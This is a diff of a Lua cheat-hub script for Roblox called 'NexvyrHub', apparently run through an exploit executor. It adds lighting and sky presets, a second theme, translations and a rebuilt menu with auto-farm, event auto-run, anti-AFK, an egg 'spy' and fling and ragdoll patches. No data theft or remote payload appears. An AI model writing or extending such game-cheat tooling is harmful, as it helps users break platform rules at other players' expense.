+    end
+end
+
+UI.Look = { Mode = nil, Sky = nil, Orig = nil, Made = {}, Hidden = {} }
+do
+    local Look = UI.Look
+    local LIGHT_PROPS = { "Ambient", "OutdoorAmbient", "FogColor", "FogStart", "FogEnd", "ColorShift_Top", "ColorShift_Bottom", "Brightness", "ClockTime", "ExposureCompensation" }
+    local PINK_SKY = "8202961731"
+
+    Look.Skies = {
+        { key = "anime",     id = "13107361022" },
+        { key = "tornado",   id = "2499807439" },
+        { key = "aesthetic", id = "7108851308" },
+        { key = "pink",      id = "8202961731" },
+        { key = "space",     id = "16262385808" },
+    }
+
+    local function c3(r, g, b) return Color3.fromRGB(r, g, b) end
+
+    local PRESET = {
+        sugar = {
+            Ambient = c3(210, 170, 195), OutdoorAmbient = c3(230, 185, 210), FogColor = c3(255, 190, 220),
+            FogStart = 250, FogEnd = 2200, ColorShift_Top = c3(255, 190, 225), ColorShift_Bottom = c3(255, 215, 235),
+            Brightness = 2.2, ClockTime = 14, ExposureCompensation = 0,
+            AtmColor = c3(255, 190, 222), AtmDecay = c3(255, 160, 205), AtmDensity = 0.28, AtmOffset = 0.2, AtmGlare = 0.2, AtmHaze = 3.2,
+            Tint = c3(255, 214, 236), Sat = 0.22, Contrast = 0.14, CcBright = 0.02,
+            BloomI = 0.4, BloomS = 28, BloomT = 0.95, RaysI = 0.12, RaysS = 0.6,
+            CloudCover = 0.55, CloudDensity = 0.5, CloudColor = c3(255, 215, 238),
+        },
+        beauty = {
+            Ambient = c3(190, 140, 185), OutdoorAmbient = c3(215, 150, 200), FogColor = c3(255, 160, 215),
+            FogStart = 300, FogEnd = 2600, ColorShift_Top = c3(255, 150, 215), ColorShift_Bottom = c3(200, 150, 255),
+            Brightness = 2.4, ClockTime = 17.5, ExposureCompensation = 0.05,
+            AtmColor = c3(255, 150, 215), AtmDecay = c3(190, 120, 255), AtmDensity = 0.3, AtmOffset = 0.25, AtmGlare = 0.6, AtmHaze = 2.4,
+            Tint = c3(255, 195, 235), Sat = 0.3, Contrast = 0.18, CcBright = 0,
+            BloomI = 0.6, BloomS = 32, BloomT = 0.9, RaysI = 0.2, RaysS = 0.7,
+            CloudCover = 0.8, CloudDensity = 0.7, CloudColor = c3(255, 190, 235),
+        },
+    }
+
+    local function make(class, name, parent)
+        local o = Instance.new(class)
+        o.Name = name
+        o.Parent = parent
+        Look.Made[#Look.Made + 1] = o
+        return o
+    end
+
+    local function restore()
+        for _, o in ipairs(Look.Made) do pcall(function() o:Destroy() end) end
+        Look.Made = {}
+        if Look.Orig then
+            for p, v in pairs(Look.Orig) do pcall(function() Lighting[p] = v end) end
+        end
+        for _, h in ipairs(Look.Hidden) do
+            local inst = h.inst
+            if inst then
+                if h.kind == "parent" then
+                    pcall(function() inst.Parent = h.parent end)
+                else
+                    for p, v in pairs(h.props) do pcall(function() inst[p] = v end) end
+                end
+            end
+        end
+        Look.Hidden = {}
+        Look.Orig = nil
+    end
+
+    local function hideParent(inst)
+        Look.Hidden[#Look.Hidden + 1] = { inst = inst, kind = "parent", parent = inst.Parent }
+        pcall(function() inst.Parent = nil end)
+    end
+
+    local function hideProps(inst, props, set)
+        Look.Hidden[#Look.Hidden + 1] = { inst = inst, kind = "props", props = props }
+        pcall(function()
+            for p, v in pairs(set) do inst[p] = v end
+        end)
+    end
+
+    Look.Cache = {}
+    Look.Tok = 0
+
+    local FACES = { "Bk", "Dn", "Ft", "Lf", "Rt", "Up" }
+
+    local function loads(url)
+        local ok = false
+        pcall(function()
+            local img = Instance.new("ImageLabel")
+            img.Image = url
+            game:GetService("ContentProvider"):PreloadAsync({ img }, function(_, st)
+                ok = (st == Enum.AssetFetchStatus.Success)
+            end)
+            img:Destroy()
+        end)
+        return ok
+    end
+
+    local function fromSky(sky)
+        local f = {}
+        for _, k in ipairs(FACES) do
+            local v = sky["Skybox" .. k]
+            if type(v) ~= "string" or v == "" then return nil end
+            f[k] = v
+        end
+        return f
+    end
+
+    local function same(url)
+        return { Bk = url, Dn = url, Ft = url, Lf = url, Rt = url, Up = url }
+    end
+
+    local function scan(inst)
+        if inst:IsA("Sky") then return fromSky(inst) end
+        if inst:IsA("Decal") or inst:IsA("Texture") then
+            if inst.Texture ~= "" then return same(inst.Texture) end
+        end
+        if inst:IsA("ImageLabel") and inst.Image ~= "" then return same(inst.Image) end
+        for _, d in ipairs(inst:GetDescendants()) do
+            if d:IsA("Sky") then
+                local f = fromSky(d)
+                if f then return f end
+            end
+        end
+        for _, d in ipairs(inst:GetDescendants()) do
+            if (d:IsA("Decal") or d:IsA("Texture")) and d.Texture ~= "" then return same(d.Texture) end
+            if d:IsA("ImageLabel") and d.Image ~= "" then return same(d.Image) end
+        end
+        return nil
+    end
+
+    function Look.resolve(id)
+        if Look.Cache[id] then return Look.Cache[id] end
+        local faces
+        pcall(function()
+            local objs = game:GetObjects("rbxassetid://" .. id)
+            if objs then
+                for _, o in ipairs(objs) do
+                    faces = faces or scan(o)
+                    pcall(function() o:Destroy() end)
+                end
+            end
+        end)
+        if not faces then
+            local n = tonumber(id)
+            local cands = {
+                "rbxassetid://" .. id,
+                "rbxassetid://" .. (n - 1),
+                "rbxassetid://" .. (n + 1),
+                "http://www.roblox.com/asset/?id=" .. id,
+                "http://www.roblox.com/asset/?id=" .. (n - 1),
+            }
+            for _, url in ipairs(cands) do
+                if loads(url) then
+                    faces = same(url)
+                    break
+                end
+            end
+        end
+        if faces then Look.Cache[id] = faces end
+        return faces
+    end
+
+    function Look.set(mode, sky)
+        restore()
+        Look.Mode, Look.Sky = mode, sky
+        Look.Tok = Look.Tok + 1
+        local tok = Look.Tok
+        if not mode and not sky then return end
+
+        local P = mode and PRESET[mode] or nil
+        local skyId
+        if sky then
+            for _, s in ipairs(Look.Skies) do
+                if s.key == sky then skyId = s.id end
+            end
+        end
+        if not skyId and mode then skyId = PINK_SKY end
+
+        local faces = skyId and Look.resolve(skyId) or nil
+        if tok ~= Look.Tok then return end
+        if skyId and not faces then
+            notify("n_sky", "triangle-alert")
+        end
+
+        if P then
+            Look.Orig = {}
+            for _, p in ipairs(LIGHT_PROPS) do
+                pcall(function() Look.Orig[p] = Lighting[p] end)
+            end
+        end
+
+        for _, ch in ipairs(Lighting:GetChildren()) do
+            if string.sub(ch.Name, 1, 14) ~= "NEXVYRHUB_LOOK" then
+                if ch:IsA("Atmosphere") and (P or faces) then
+                    hideParent(ch)
+                elseif ch:IsA("Sky") and faces then
+                    hideParent(ch)
+                elseif P and (ch:IsA("ColorCorrectionEffect") or ch:IsA("BloomEffect") or ch:IsA("SunRaysEffect")) then
+                    hideProps(ch, { Enabled = ch.Enabled }, { Enabled = false })
+                end
+            end
+        end
+
+        if faces then
+            local s = make("Sky", "NEXVYRHUB_LOOK_SKY", Lighting)
+            s.SkyboxBk, s.SkyboxDn, s.SkyboxFt = faces.Bk, faces.Dn, faces.Ft
+            s.SkyboxLf, s.SkyboxRt, s.SkyboxUp = faces.Lf, faces.Rt, faces.Up
+            s.StarCount = 0
+            s.CelestialBodiesShown = false
+        end
+
+        if not P then return end
+
+        for _, p in ipairs(LIGHT_PROPS) do
+            if P[p] ~= nil then pcall(function() Lighting[p] = P[p] end) end
+        end
+
+        local atm = make("Atmosphere", "NEXVYRHUB_LOOK_ATM", Lighting)
+        atm.Color, atm.Decay, atm.Density, atm.Offset, atm.Glare, atm.Haze = P.AtmColor, P.AtmDecay, P.AtmDensity, P.AtmOffset, P.AtmGlare, P.AtmHaze
+
+        local cc = make("ColorCorrectionEffect", "NEXVYRHUB_LOOK_CC", Lighting)
+        cc.TintColor, cc.Saturation, cc.Contrast, cc.Brightness = P.Tint, P.Sat, P.Contrast, P.CcBright
+
+        local bl = make("BloomEffect", "NEXVYRHUB_LOOK_BLOOM", Lighting)
+        bl.Intensity, bl.Size, bl.Threshold = P.BloomI, P.BloomS, P.BloomT
+
+        local sr = make("SunRaysEffect", "NEXVYRHUB_LOOK_RAYS", Lighting)
+        sr.Intensity, sr.Spread = P.RaysI, P.RaysS
+
+        local terrain = Workspace:FindFirstChildOfClass("Terrain")
+        if terrain then
+            for _, ch in ipairs(terrain:GetChildren()) do
+                if ch:IsA("Clouds") and string.sub(ch.Name, 1, 14) ~= "NEXVYRHUB_LOOK" then
+                    hideProps(ch, { Enabled = ch.Enabled }, { Enabled = false })
+                end
+            end
+            local cl = make("Clouds", "NEXVYRHUB_LOOK_CLOUDS", terrain)
+            cl.Cover, cl.Density, cl.Color, cl.Enabled = P.CloudCover, P.CloudDensity, P.CloudColor, true
+        end
+    end
+end
 local _version = "1.6.66"
 local uiFileName = "WindUI_Cache_v" .. _version .. ".txt"
 local timeFileName = "WindUI_Cache_v" .. _version .. "_Time.txt"
@@ -1848,111 +2917,43 @@ pcall(function()
     })
 end)
 
-Window = WindUI:CreateWindow({
-    Title = CFG.Titulo,
-    Theme = "Violeta",
-    Author = "7.dui",
-    Folder = "NexvyrHub_WindUI",
-    Acrylic = false,
-    Transparent = false,
-    NewElements = true,
-    HideSearchBar = true,
-    OpenButton = {
-        Title = "Open HUB",
-        CornerRadius = UDim.new(1),
-        StrokeThickness = 1,
-        Enabled = true,
-        Draggable = true,
-        Scale = 0.8,
-        Color = ColorSequence.new(Color3.fromHex("#6d28d9"), Color3.fromHex("#3b0764"))
-    },
-    Topbar = {
-        Height = 44,
-        ButtonsType = "Default"
-    }
-})
-if not Window then
-    Alive = false
-    return
+pcall(function()
+    WindUI:AddTheme({
+        Name        = "RosaOscuro",
+        Accent      = Color3.fromHex("#4a0d2e"),
+        Dialog      = Color3.fromHex("#2e0a1f"),
+        Outline     = Color3.fromHex("#be185d"),
+        Text        = Color3.fromHex("#fce7f3"),
+        Placeholder = Color3.fromHex("#db2777"),
+        Background  = Color3.fromHex("#1f0514"),
+        Button      = Color3.fromHex("#9d174d"),
+        Icon        = Color3.fromHex("#f9a8d4"),
+        Toggle      = Color3.fromHex("#be185d"),
+        Slider      = Color3.fromHex("#be185d"),
+        Checkbox    = Color3.fromHex("#be185d"),
+    })
+end)
+
+local function applyEventLock()
+    if not EventToggle then return end
+    if S.EventoLock and S.Evento then
+        pcall(function() EventToggle:Lock() end)
+    else
+        pcall(function() EventToggle:Unlock() end)
+    end
 end
-pcall(function() WindUI:SetTheme("Violeta") end)
-
-local TabFarm    = Window:Tab({ Title = "Auto farmeo", Icon = "solar:dollar-bold" })
-local TabConfig  = Window:Tab({ Title = "Configurar",  Icon = "solar:settings-bold" })
-
-TabFarm:Toggle({
-    Title = "Farm", Icon = "pickaxe", Value = false,
-    Callback = function(v)
-        if v then
-            S.Under = false
-            S.Farm = true
-            S.Estado = "Iniciando..."
-        else
-            S.Farm = false
-            S.Busy = false
-            S.Carried = false
-            S.RecTry = 0
-            S.Estado = "Apagado"
-        end
-    end,
-})
-
-TabFarm:Toggle({
-    Title = "Cargar zonas lejanas (huevos caros)", Icon = "map", Value = true,
-    Callback = function(v)
-        S.StreamZonas = v and true or false
-    end,
-})
-
-local zonaValues = { AUTO_ZONA }
-for i, z in ipairs(ZONAS) do
-    local lb = string.format("Zona %d | pide %s", i, fmt(z.Poder))
-    zonaValues[#zonaValues + 1] = lb
-    ZonaByLabel[lb] = i
-end
-
-TabFarm:Dropdown({
-    Title  = "Zona maxima",
-    Icon   = "map",
-    Values = zonaValues,
-    Value  = AUTO_ZONA,
-    Callback = function(opt)
-        if type(opt) == "table" then opt = opt.Title or opt[1] end
-        if opt == nil or opt == AUTO_ZONA then
-            S.ZonaMax = nil
-        else
-            S.ZonaMax = ZonaByLabel[opt]
-            local safe = safeMaxZone()
-            if S.ZonaMax and S.ZonaMax > safe then
-                notify("Tu velocidad solo aguanta hasta la zona " .. safe .. ", se usa esa", "triangle-alert")
-            end
-        end
-        S.Selected = nil
-        lastSig = ""
-    end,
-})
-
-TabFarm:Toggle({
-    Title = "Anti-afk", Icon = "timer", Value = false,
-    Callback = function(v)
-        S.AntiAfk = v and true or false
-    end,
-})
-
-TabConfig:Toggle({
-    Title = "FPS Boost", Icon = "zap", Value = false,
-    Callback = function(v)
-        fxSet(v and true or false)
-    end,
-})
 
 local function unload()
     if not Alive then return end
     Alive = false
-    S.Farm, S.AntiGolpe, S.IrHuevo, S.Espiar, S.AntiAfk = false, false, false, false, false
+    S.Farm, S.Evento, S.Run, S.AntiGolpe, S.IrHuevo, S.Espiar, S.AntiAfk = false, false, false, false, false, false, false
+    S.Gen = S.Gen + 1
     applyFlingBlock(false)
     patchRagdoll(false)
     lockStates(false)
+    pcall(Move.release, true)
+    pcall(UI.Look.set, nil, nil)
+    pcall(rendSet, false)
     if FX.On then
         FX.On = false
         FX.Token = FX.Token + 1
@@ -1963,12 +2964,405 @@ local function unload()
     end
     for _, c in ipairs(Conns) do pcall(function() c:Disconnect() end) end
     if HL then pcall(function() HL:Destroy() end) end
+    if SpyBill then pcall(function() SpyBill:Destroy() end) end
     pcall(function() RunService:Set3dRenderingEnabled(true) end)
     if Window then pcall(function() Window:Destroy() end) end
     genv.NEXVYRHUB_UNLOAD = nil
 end
+
+UI.Reg = {}
+UI.Dd = {}
+UI.LANGS = {
+    { code = "en", label = "English" },
+    { code = "es", label = "Español" },
+    { code = "ja", label = "日本語" },
+    { code = "ru", label = "Русский" },
+}
+
+function UI.reg(obj, tkey, dkey, scan)
+    if obj then UI.Reg[#UI.Reg + 1] = { obj = obj, t = tkey, d = dkey, scan = scan } end
+    return obj
+end
+
+function UI.labels()
+    local L = {}
+    L.autoZona = tr("zone_auto")
+    L.zonas = { L.autoZona }
+    L.zonaKey = {}
+    for i, z in ipairs(ZONAS) do
+        local lb = tr("zone_fmt", i, fmt(z.Poder))
+        L.zonas[#L.zonas + 1] = lb
+        L.zonaKey[lb] = i
+    end
+    L.zonaCur = L.autoZona
+    if S.ZonaMax and ZONAS[S.ZonaMax] then
+        L.zonaCur = tr("zone_fmt", S.ZonaMax, fmt(ZONAS[S.ZonaMax].Poder))
+    end
+
+    L.themes = { tr("theme_violet"), tr("theme_pink") }
+    L.themeKey = { [L.themes[1]] = "Violeta", [L.themes[2]] = "RosaOscuro" }
+    L.themeCur = UI.Theme == "RosaOscuro" and L.themes[2] or L.themes[1]
+
+    L.skies = { tr("sky_default") }
+    L.skyKey = {}
+    local cur = L.skies[1]
+    for _, s in ipairs(UI.Look.Skies) do
+        local lb = tr("sky_" .. s.key)
+        L.skies[#L.skies + 1] = lb
+        L.skyKey[lb] = s.key
+        if UI.Look.Sky == s.key then cur = lb end
+    end
+    L.skyDefault = L.skies[1]
+    L.skyCur = cur
+    UI.L = L
+    return L
+end
+
+function UI.relabel(old, new)
+    if old == nil or new == nil or old == new then return end
+    local root = (gethui and gethui()) or CoreGui
+    pcall(function()
+        for _, d in ipairs(root:GetDescendants()) do
+            if (d:IsA("TextLabel") or d:IsA("TextButton")) and d.Text == old then
+                d.Text = new
+            end
+        end
+    end)
+end
+
+function UI.applyLang(old)
+    UI.Building = true
+    for _, r in ipairs(UI.Reg) do
+        local okT = false
+        if r.t then
+            okT = pcall(function() r.obj:SetTitle(tr(r.t)) end)
+        end
+        if r.d then
+            pcall(function() r.obj:SetDesc(tr(r.d)) end)
+        end
+        if r.t and r.scan and not okT then
+            UI.relabel(I18N[old] and I18N[old][r.t], tr(r.t))
+        end
+    end
+
+    local L = UI.labels()
+    local function refresh(dd, values, cur)
+        if not dd then return end
+        pcall(function() dd:Refresh(values) end)
+        pcall(function() dd:Select(cur) end)
+    end
+    refresh(UI.Dd.zona, L.zonas, L.zonaCur)
+    refresh(UI.Dd.theme, L.themes, L.themeCur)
+    refresh(UI.Dd.sky, L.skies, L.skyCur)
+
+    lastSpyKey = ""
+    if S.Espiar then
+        task.spawn(function() pcall(refreshSpy) end)
+    else
+        spySet(tr("spy_off_title"), tr("spy_off_desc"))
+        spyListSet(tr("ranking"), "-")
+    end
+
+    task.delay(0.6, function() UI.Building = false end)
+end
+
+function UI.build()
+    UI.Building = true
+    local L = UI.labels()
+
+    local pink = UI.Theme == "RosaOscuro"
+    local openColor = pink
+        and ColorSequence.new(Color3.fromHex("#be185d"), Color3.fromHex("#500724"))
+        or ColorSequence.new(Color3.fromHex("#6d28d9"), Color3.fromHex("#3b0764"))
+
+    local win = WindUI:CreateWindow({
+        Title = CFG.Titulo,
+        Theme = UI.Theme,
+        Author = "7.dui",
+        Folder = "NexvyrHub_WindUI",
+        Acrylic = false,
+        Transparent = false,
+        NewElements = true,
+        HideSearchBar = true,
+        OpenButton = {
+            Title = "Open HUB",
+            CornerRadius = UDim.new(1),
+            StrokeThickness = 1,
+            Enabled = true,
+            Draggable = true,
+            Scale = 0.8,
+            Color = openColor,
+        },
+        Topbar = {
+            Height = 44,
+            ButtonsType = "Default"
+        }
+    })
+    if not win then
+        UI.Building = false
+        return false
+    end
+    Window = win
+    pcall(function() WindUI:SetTheme(UI.Theme) end)
+
+    local TabInfo    = UI.reg(win:Tab({ Title = tr("tab_info"),     Icon = "solar:info-circle-bold" }), "tab_info", nil, true)
+    local TabFarm    = UI.reg(win:Tab({ Title = tr("tab_farm"),     Icon = "solar:dollar-bold" }), "tab_farm", nil, true)
+    local TabEvento  = UI.reg(win:Tab({ Title = tr("tab_event"),    Icon = "solar:bolt-bold" }), "tab_event", nil, true)
+    local TabVer     = UI.reg(win:Tab({ Title = tr("tab_eggs"),     Icon = "solar:eye-bold" }), "tab_eggs", nil, true)
+    local TabConfig  = UI.reg(win:Tab({ Title = tr("tab_settings"), Icon = "solar:settings-bold" }), "tab_settings", nil, true)
+
+    pcall(function()
+        UI.reg(TabInfo:Paragraph({ Title = tr("info_title"), Desc = tr("info_desc") }), "info_title", "info_desc")
+    end)
+    pcall(function() TabInfo:Select() end)
+
+    EventToggle = UI.reg(TabEvento:Toggle({
+        Title = tr("event_toggle"), Value = S.Evento,
+        Callback = function(v)
+            if UI.Building then return end
+            Move.reset()
+            if v then
+                if not S.Evento then
+                    S.Evento = true
+                    runUpdate()
+                    EvState.Idle = os.clock()
+                    EvState.Stream = 0
+                    EvState.Ran = false
+                    EvState.TitanicDone = false
+                    EvState.TIdle = nil
+                    S.Under = false
+                    S.Estado = "Evento: iniciando..."
+                end
+                applyEventLock()
+            else
+                if S.Evento and S.EventoLock and os.clock() > S.EvFinish then
+                    task.defer(function()
+                        if EventToggle then pcall(function() EventToggle:Set(true) end) end
+                    end)
+                    return
+                end
+                S.Evento = false
+                runUpdate()
+                if not S.Farm then
+                    S.Busy = false
+                    S.Estado = "Apagado"
+                end
+            end
+        end,
+    }), "event_toggle")
+
+    EventLockToggle = UI.reg(TabEvento:Toggle({
+        Title = tr("lock_title"),
+        Desc  = tr("lock_desc"),
+        Value = S.EventoLock,
+        Callback = function(v)
+            if UI.Building then return end
+            S.EventoLock = v and true or false
+            applyEventLock()
+        end,
+    }), "lock_title", "lock_desc")
+
+    UI.reg(TabFarm:Toggle({
+        Title = tr("farm"), Value = S.Farm,
+        Callback = function(v)
+            if UI.Building then return end
+            Move.reset()
+            if v then
+                S.Under = false
+                S.Farm = true
+                runUpdate()
+                S.Estado = "Iniciando..."
+            else
+                S.Farm = false
+                runUpdate()
+                if not S.Evento then
+                    S.Busy = false
+                    S.Carried = false
+                    S.RecTry = 0
+                    S.Estado = "Apagado"
+                end
+            end
+        end,
+    }), "farm")
+
+    UI.reg(TabFarm:Toggle({
+        Title = tr("stream"), Value = S.StreamZonas,
+        Callback = function(v)
+            if UI.Building then return end
+            S.StreamZonas = v and true or false
+        end,
+    }), "stream")
+
+    UI.Dd.zona = UI.reg(TabFarm:Dropdown({
+        Title  = tr("zone_max"),
+        Icon   = "map",
+        Values = L.zonas,
+        Value  = L.zonaCur,
+        Callback = function(opt)
+            if UI.Building then return end
+            if type(opt) == "table" then opt = opt.Title or opt[1] end
+            if opt == nil or opt == UI.L.autoZona then
+                S.ZonaMax = nil
+            else
+                S.ZonaMax = UI.L.zonaKey[opt]
+                local safe = safeMaxZone()
+                if S.ZonaMax and S.ZonaMax > safe then
+                    notify("n_cap", "triangle-alert", safe)
+                end
+            end
+            S.Selected = nil
+            lastSig = ""
+        end,
+    }), "zone_max")
+
+    UI.reg(TabFarm:Toggle({
+        Title = tr("antiafk"), Value = S.AntiAfk,
+        Callback = function(v)
+            if UI.Building then return end
+            S.AntiAfk = v and true or false
+        end,
+    }), "antiafk")
+
+    UI.reg(TabVer:Toggle({
+        Title = tr("spy"), Value = S.Espiar,
+        Callback = function(v)
+            if UI.Building then return end
+            S.Espiar = v and true or false
+            lastSpyKey = ""
+            if S.Espiar then
+                task.spawn(function() pcall(refreshSpy) end)
+            else
+                setHighlight(nil)
+                spyBillboard(nil)
+                spySet(tr("spy_off_title"), tr("spy_off_desc"))
+                spyListSet(tr("ranking"), "-")
+            end
+        end,
+    }), "spy")
+
+    pcall(function()
+        SpyPara = TabVer:Paragraph({ Title = tr("spy_off_title"), Desc = tr("spy_off_desc") })
+    end)
+    pcall(function()
+        SpyList = TabVer:Paragraph({ Title = tr("ranking"), Desc = "-" })
+    end)
+    if S.Espiar then task.spawn(function() pcall(refreshSpy) end) end
+
+    UI.reg(TabConfig:Toggle({
+        Title = tr("fpsboost"), Value = S.FpsBoost,
+        Callback = function(v)
+            if UI.Building then return end
+            S.FpsBoost = v and true or false
+            fxRefresh()
+        end,
+    }), "fpsboost")
+
+    UI.reg(TabConfig:Toggle({
+        Title = tr("performance"), Value = S.Rend,
+        Callback = function(v)
+            if UI.Building then return end
+            rendSet(v and true or false)
+        end,
+    }), "performance")
+
+    UI.Dd.theme = UI.reg(TabConfig:Dropdown({
+        Title  = tr("themes"),
+        Icon   = "palette",
+        Values = L.themes,
+        Value  = L.themeCur,
+        Callback = function(opt)
+            if UI.Building then return end
+            if type(opt) == "table" then opt = opt.Title or opt[1] end
+            local key = UI.L.themeKey[opt]
+            if key and key ~= UI.Theme then
+                UI.Theme = key
+                pcall(function() WindUI:SetTheme(key) end)
+            end
+        end,
+    }), "themes")
+
+    local okSec, sec = pcall(function() return TabConfig:Section({ Title = tr("graphics") }) end)
+    if okSec and sec then
+        UI.reg(sec, "graphics", nil, true)
+    else
+        pcall(function() TabConfig:Divider() end)
+        pcall(function() UI.reg(TabConfig:Paragraph({ Title = tr("graphics"), Desc = "" }), "graphics") end)
+    end
+
+    local tSugar, tBeauty
+    tSugar = UI.reg(TabConfig:Toggle({
+        Title = tr("sugar"), Value = UI.Look.Mode == "sugar",
+        Callback = function(v)
+            if UI.Building then return end
+            if v then
+                UI.Look.set("sugar", UI.Look.Sky)
+                if tBeauty then pcall(function() tBeauty:Set(false) end) end
+            elseif UI.Look.Mode == "sugar" then
+                UI.Look.set(nil, UI.Look.Sky)
+            end
+        end,
+    }), "sugar")
+    tBeauty = UI.reg(TabConfig:Toggle({
+        Title = tr("beauty"), Value = UI.Look.Mode == "beauty",
+        Callback = function(v)
+            if UI.Building then return end
+            if v then
+                UI.Look.set("beauty", UI.Look.Sky)
+                if tSugar then pcall(function() tSugar:Set(false) end) end
+            elseif UI.Look.Mode == "beauty" then
+                UI.Look.set(nil, UI.Look.Sky)
+            end
+        end,
+    }), "beauty")
+
+    UI.Dd.sky = UI.reg(TabConfig:Dropdown({
+        Title  = tr("sky"),
+        Icon   = "cloud",
+        Values = L.skies,
+        Value  = L.skyCur,
+        Callback = function(opt)
+            if UI.Building then return end
+            if type(opt) == "table" then opt = opt.Title or opt[1] end
+            UI.Look.set(UI.Look.Mode, UI.L.skyKey[opt])
+        end,
+    }), "sky")
+
+    local langLabels, langByLabel, curLang = {}, {}, "English"
+    for _, l in ipairs(UI.LANGS) do
+        langLabels[#langLabels + 1] = l.label
+        langByLabel[l.label] = l.code
+        if l.code == UI.Lang then curLang = l.label end
+    end
+    UI.reg(TabConfig:Dropdown({
+        Title  = tr("language"),
+        Icon   = "globe",
+        Values = langLabels,
+        Value  = curLang,
+        Callback = function(opt)
+            if UI.Building then return end
+            if type(opt) == "table" then opt = opt.Title or opt[1] end
+            local code = langByLabel[opt]
+            if not code or code == UI.Lang then return end
+            local old = UI.Lang
+            UI.Lang = code
+            UI.applyLang(old)
+            notify("n_lang", "globe")
+        end,
+    }), "language")
+
+    pcall(function() win:OnDestroy(unload) end)
+
+    applyEventLock()
+    task.delay(0.4, function() UI.Building = false end)
+    return true
+end
+
+if not UI.build() then
+    Alive = false
+    return
+end
+
 genv.NEXVYRHUB_UNLOAD = unload
-pcall(function() Window:OnDestroy(unload) end)
 
 applyFlingBlock(true)
 patchRagdoll(true)
